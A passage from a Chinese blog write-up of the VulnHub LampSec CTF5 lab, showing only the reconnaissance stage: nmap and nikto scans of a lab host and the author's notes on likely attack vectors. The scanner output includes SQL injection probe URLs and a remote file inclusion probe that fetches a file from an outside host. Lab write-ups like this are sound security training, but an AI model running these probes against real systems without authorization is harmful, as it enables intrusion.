<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[vulnhub]  LampSec-CTF5 | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  LampSec-CTF5</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-23T16:29:19.558Z" id="date"> 2023-05-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-23T16:34:36.999Z" id="updated"> 2023-05-24</time></div></span><br><span>Word Count: <div class="control">6.6k</div></span><br><span>Read Time: <div class="control">39 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/xixi.jpg'><img src="/pic/xixi.jpg" alt="xixi"></p>
<span id="more"></span>

<h2 id="Info-Gather"><a href="#Info-Gather" class="headerlink" title="Info Gather"></a>Info Gather</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sn 192.168.56.0/24                     <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.1<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.2<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:EC:CE:9E (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.139<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:7D:00:15 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.254<br>Host is up (0.00042s latency).<br>MAC Address: 00:50:56:FE:21:A5 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.132<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 2.08 seconds<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -p- --min-rate=10000 192.168.56.139<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:40 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.139<br>Host is up (0.0017s latency).<br>Not shown: 65524 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>25/tcp    open  smtp<br>80/tcp    open  http<br>110/tcp   open  pop3<br>111/tcp   open  rpcbind<br>139/tcp   open  netbios-ssn<br>143/tcp   open  imap<br>445/tcp   open  microsoft-ds<br>901/tcp   open  samba-swat<br>3306/tcp  open  mysql<br>53728/tcp open  unknown<br>MAC Address: 00:0C:29:7D:00:15 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.57 seconds<br></code></pre></td></tr></table></figure>
<p>开了这么多端口，如此多的可能性。<br>可能比较好用的攻击向量：80-web, 139&amp;445-samba<br>然后是：53728，901，25，110，111<br>剩下其他的最后看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sU -p- --min-rate=10000 192.168.56.139                          <br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:48 CST<br>Warning: 192.168.56.139 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.139<br>Host is up (0.0014s latency).<br>Not shown: 65454 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)<br>PORT      STATE SERVICE<br>111/udp   open  rpcbind<br>5353/udp  open  zeroconf<br>32768/udp open  omad<br>MAC Address: 00:0C:29:7D:00:15 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 72.70 second<br></code></pre></td></tr></table></figure>
<p>都可以看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -p22,25,80,110,111,139,143,445,901,3306,5353,32768,53728 192.168.56.139<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.139<br>Host is up (0.00098s latency).<br><br>PORT      STATE  SERVICE     VERSION<br>22/tcp    open   ssh         OpenSSH 4.7 (protocol 2.0)<br>25/tcp    open   smtp        Sendmail 8.14.1/8.14.1<br>80/tcp    open   http        Apache httpd 2.2.6 ((Fedora))<br>110/tcp   open   pop3        ipop3d 2006k.101<br>111/tcp   open   rpcbind     2-4 (RPC <span class="hljs-comment">#100000)</span><br>139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>143/tcp   open   imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)<br>445/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>901/tcp   open   http        Samba SWAT administration server<br>3306/tcp  open   mysql       MySQL 5.0.45<br>5353/tcp  closed mdns<br>32768/tcp closed filenet-tms<br>53728/tcp open   status      1 (RPC <span class="hljs-comment">#100024)</span><br>MAC Address: 00:0C:29:7D:00:15 (VMware)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 2.6.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6<br>OS details: Linux 2.6.9 - 2.6.30<br>Network Distance: 1 hop<br>Service Info: Hosts: localhost.localdomain, 192.168.56.139; OS: Unix<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.11 seconds<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln 192.168.56.139<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-26 15:55 CST<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.139<br>Host is up (0.0014s latency).<br>Not shown: 990 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>25/tcp   open  smtp<br>| smtp-vuln-cve2010-4344: <br>|_  The SMTP server is not Exim: NOT VULNERABLE<br>80/tcp   open  http<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.139<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.56.139:80/?page=contact<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: ?page=contact<br>|     <br>|     Path: http://192.168.56.139:80/events/<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /events/?q=node&amp;destination=node<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=user/register<br>|     Form <span class="hljs-built_in">id</span>: user-register<br>|     Form action: /events/?q=user/register<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=user/password<br>|     Form <span class="hljs-built_in">id</span>: user-pass<br>|     Form action: /events/?q=user/password<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event/2009/04/29<br>|     Form <span class="hljs-built_in">id</span>: event-taxonomy-filter-form<br>|     Form action: /events/?q=event/2009/04/29<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event/2009/04/29<br>|     Form <span class="hljs-built_in">id</span>: event-type-filter-form<br>|     Form action: /events/?q=event/2009/04/29<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event/2009/04/29<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /events/?q=event/2009/04/29&amp;destination=event%2F2009%2F04%2F29<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event/2023/04/26/month<br>|     Form <span class="hljs-built_in">id</span>: event-taxonomy-filter-form<br>|     Form action: /events/?q=event/2023/04/26/month<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event/2023/04/26/month<br>|     Form <span class="hljs-built_in">id</span>: event-type-filter-form<br>|     Form action: /events/?q=event/2023/04/26/month<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event/2023/04/26/month<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /events/?q=event/2023/04/26/month&amp;destination=event%2F2023%2F04%2F26%2Fmonth<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event<br>|     Form <span class="hljs-built_in">id</span>: event-taxonomy-filter-form<br>|     Form action: /events/?q=event<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event<br>|     Form <span class="hljs-built_in">id</span>: event-type-filter-form<br>|     Form action: /events/?q=event<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /events/?q=event&amp;destination=event<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event/2023/03/01/month/all/all/1<br>|     Form <span class="hljs-built_in">id</span>: event-taxonomy-filter-form<br>|     Form action: /events/?q=event/2023/03/01/month/all/all/1<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event/2023/03/01/month/all/all/1<br>|     Form <span class="hljs-built_in">id</span>: event-type-filter-form<br>|     Form action: /events/?q=event/2023/03/01/month/all/all/1<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=event/2023/03/01/month/all/all/1<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /events/?q=event/2023/03/01/month/all/all/1&amp;destination=event%2F2023%2F03%2F01%2Fmonth%2Fall%2Fall%2F1<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=node&amp;amp;destination=node<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /events/?q=node&amp;destination=node%3Famp%253Bdestination%3Dnode<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=blog<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /events/?q=blog&amp;destination=blog<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=comment/reply/2<br>|     Form <span class="hljs-built_in">id</span>: comment-form<br>|     Form action: /events/?q=comment/reply/2<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=comment/reply/2<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /events/?q=comment/reply/2&amp;destination=comment%2Freply%2F2<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=node/2<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /events/?q=node/2&amp;destination=node%2F2<br>|     <br>|     Path: http://192.168.56.139:80/events/?q=blog/1<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|_    Form action: /events/?q=blog/1&amp;destination=blog%2F1<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       http://ha.ckers.org/slowloris/<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>| http-enum: <br>|   /info.php: Possible information file<br>|   /phpmyadmin/: phpMyAdmin<br>|   /squirrelmail/src/login.php: squirrelmail version 1.4.11-1.fc8<br>|   /squirrelmail/images/sm_logo.png: SquirrelMail<br>|   /icons/: Potentially interesting folder w/ directory listing<br>|_  /inc/: Potentially interesting folder<br>| http-fileupload-exploiter: <br>|   <br>|_    Couldn<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|_http-trace: TRACE is enabled</span><br><span class="hljs-string">| http-sql-injection: </span><br><span class="hljs-string">|   Possible sqli for queries:</span><br><span class="hljs-string">|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/?page=contact%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/?page=about%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Ffeed%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|_    http://192.168.56.139:80/events/?q=event%2Fical%27%20OR%20sqlspider</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>110/tcp  open  pop3<br>111/tcp  open  rpcbind<br>139/tcp  open  netbios-ssn<br>143/tcp  open  imap<br>445/tcp  open  microsoft-ds<br>901/tcp  open  samba-swat<br>3306/tcp open  mysql<br>|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)<br>MAC Address: 00:0C:29:7D:00:15 (VMware)<br><br>Host script results:<br>|_smb-vuln-ms10-061: <span class="hljs-literal">false</span><br>|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)<br>|_smb-vuln-ms10-054: <span class="hljs-literal">false</span><br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 170.56 seconds<br></code></pre></td></tr></table></figure>
<p>http-enum和http-sql-injection部分挺让人感兴趣。之后重点看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf5/workSpace]<br>└─$ sudo nikto -h 192.168.56.139          <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.56.139<br>+ Target Hostname:    192.168.56.139<br>+ Target Port:        80<br>+ Start Time:         2023-04-26 16:29:26 (GMT8)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.2.6 (Fedora)<br>+ /: Retrieved x-powered-by header: PHP/5.2.4.<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ Apache/2.2.6 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ /: HTTP TRACE method is active <span class="hljs-built_in">which</span> suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing<br>+ /index.php: PHP include error may indicate <span class="hljs-built_in">local</span> or remote file inclusion is possible.<br>+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184<br>+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184<br>+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184<br>+ /phpmyadmin/changelog.php: phpMyAdmin is <span class="hljs-keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.<br>+ /phpmyadmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpmyadmin/ChangeLog, inode: 558008, size: 22676, mtime: Tue Aug 21 10:59:12 2029. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418<br>+ /phpmyadmin/ChangeLog: phpMyAdmin is <span class="hljs-keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.<br>+ /mail/src/read_body.php: Cookie SQMSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies<br>+ /mail/src/read_body.php: SquirrelMail found.<br>+ /squirrelmail/src/read_body.php: SquirrelMail found.<br>+ /info.php: Output from the phpinfo() <span class="hljs-keyword">function</span> was found.<br>+ /info.php: PHP is installed, and a <span class="hljs-built_in">test</span> script <span class="hljs-built_in">which</span> runs phpinfo() was found. This gives a lot of system information. See: CWE-552<br>+ /icons/: Directory indexing found.<br>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/<br>+ /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake<span class="hljs-string">&#x27;s RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2</span><br><span class="hljs-string">+ /phpmyadmin/: phpMyAdmin directory found.</span><br><span class="hljs-string">+ /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="hljs-string">+ /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/</span><br><span class="hljs-string">+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span><br><span class="hljs-string">+ 8908 requests: 0 error(s) and 26 item(s) reported on remote host</span><br><span class="hljs-string">+ End Time:           2023-04-26 16:29:51 (GMT8) (25 seconds)</span><br><span class="hljs-string">---------------------------------------------------------------------------</span><br><span 